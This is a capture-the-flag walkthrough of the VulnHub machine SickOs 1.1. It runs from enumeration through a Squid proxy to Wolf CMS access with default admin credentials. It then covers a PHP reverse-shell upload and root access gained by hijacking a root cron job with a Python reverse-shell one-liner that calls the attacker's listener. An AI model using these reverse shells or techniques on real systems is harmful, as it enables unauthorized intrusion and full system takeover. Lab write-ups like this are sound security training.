# SickOs: 1.1

## 1.Get VM IP

```text
root㉿kali:~# arp-scan -I eth1 -l
                       
Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.229 00:0c:29:25:b7:8a       VMware, Inc.
192.168.127.254 00:50:56:fd:64:8a       VMware, Inc.
```
The IP address is `192.168.127.229`, let's enumerate it.

## 2.Enumeration

```text
root㉿kali:~# nmap -sV -sC -p- -oN fullscan 192.168.127.229

Nmap scan report for 192.168.127.229
Host is up (0.00041s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
MAC Address: 00:0C:29:25:B7:8A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port `3128` is for squid proxy and is open, so the system is using some kind of proxy here

and port 8080 is closed, maybe because of proxy.

so we need to proxy our traffic through squid to see if any website is available, go [here](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid) for details.

```text
root㉿kali:~# curl --proxy http://192.168.127.229:3128 http://192.168.127.229

<h1>
BLEHHH!!!
</h1>
```

yes, there is a website here, let's check for `robots.txt` :

```text
root㉿kali:~# curl --proxy http://192.168.127.229:3128 http://192.168.127.229/robots.txt

User-agent: *
Disallow: /
Dissalow: /wolfcms
```

the path `wolfcmd` is dissalowed here, i just set my firefox proxy to point to `192.168.127.229:3128` and visited the `/wolfcms` :

![mainpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d1740ada-f57f-4b86-bed9-010d97eac250)

since this is a CMS, i quickly checked searchsploit for any exploits :

```text
searchsploit wolf cms  
----------------------------------------------------------------------------------
 Exploit Title                                          |  Path
----------------------------------------------------------------------------------
Wolf CMS - Arbitrary File Upload / Execution            | php/webapps/38000.txt
Wolf CMS 0.6.0b - Multiple Vulnerabilities              | php/webapps/15614.html
Wolf CMS 0.7.5 - Multiple Vulnerabilities               | php/webapps/18545.txt
Wolf CMS 0.8.2 - Arbitrary File Upload                  | php/webapps/36818.php
Wolf CMS 0.8.2 - Arbitrary File Upload (Metasploit)     | php/remote/40004.rb
Wolf CMS 0.8.3.1 - Remote Code Execution (RCE)          | php/webapps/51421.txt
----------------------------------------------------------------------------------
Shellcodes: No Results
```

i looked at one of [them](https://www.exploit-db.com/exploits/38000), and it mentioned a vulnerable URL there (http://targetsite.com/wolfcms/?/admin/plugin/file_manager/browse/)

just manually visited the url and i was redirected to a login page (i did not know the exact path of admin page but i found it this way)

simply tried `admin:admin` and booom, i was in.

## 3.Gaining Shell

Looking at the result of the searchsploit for RCE [php/webapps/51421.txt](https://www.exploit-db.com/exploits/51421) i created a php reverse shell from pentestmonkey and put it

in `Files` menu and `Create new file` saved it and located it in `/public` :

![shell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/90440763-4b65-4ac5-a76f-18bc7133ef30)

open the `shell.php` and prepare a listener on your kali machine, you will get the shell.

```text
root㉿kali:~# nc -nvlp 4444
listening on [any] 4444 ...

connect to [192.168.127.128] from (UNKNOWN) [192.168.127.229] 41750
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 22:03:28 up  2:01,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4.Privilege Escalation

I navigated to `/var/www` and found a python file which is world writable :

```text
www-data@SickOs:/$ cd /var/www
www-data@SickOs:/var/www$ ls -l
total 16
-rwxrwxrwx 1 root root  319 Sep 19 20:55 connect.py
-rw-r--r-- 1 root root   21 Dec  5  2015 index.php
-rw-r--r-- 1 root root   45 Dec  5  2015 robots.txt
drwxr-xr-x 5 root root 4096 Dec  5  2015 wolfcms
```

and the content of the file is interesting :

```python
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"
```

as it says here that does execute the program `frequently`, i guessed maybe there is a cronjob for it on the system

just check the cronjobs :

```text
www-data@SickOs:/var/www$ ls /etc/cron*
/etc/crontab

/etc/cron.d:
automate  php5

/etc/cron.daily:
apache2  apt       bsdmainutils  logrotate  mlocate  popularity-contest  update-notifier-common
apport   aptitude  dpkg          man-db     passwd   standard

/etc/cron.hourly:

/etc/cron.monthly:

/etc/cron.weekly:
apt-xapian-index  man-db
```

yes, there is a `automate` file in `cron.d` that executes the connect.py

```text
www-data@SickOs:/var/www$ cat /etc/cron.d/automate 

* * * * * root /usr/bin/python /var/www/connect.py
```

start another listener and just paste a python reverse shell in this file :

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.127.128",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

wait for a minute and you will get the root shell and find the flag in /root:

```text
root㉿kali:~#nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.229] 41760
# id
id
uid=0(root) gid=0(root) groups=0(root)

# ls /root 
ls /root
a0216ea4d51874464078c618298b1367.txt

# cat /root/a0216ea4d51874464078c618298b1367.txt
cat /root/a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

this is how you can hack this machine :)






